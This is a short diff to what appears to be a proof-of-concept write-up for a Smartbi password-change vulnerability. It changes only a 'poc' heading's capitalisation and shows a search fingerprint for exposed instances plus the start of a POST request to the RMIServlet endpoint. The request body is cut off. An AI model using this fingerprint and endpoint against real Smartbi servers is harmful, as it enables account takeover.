@@ -8,7 +8,7 @@ Smartbi修改用户密码漏洞
 body="gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /smartbi/vision/RMIServlet HTTP/1.1
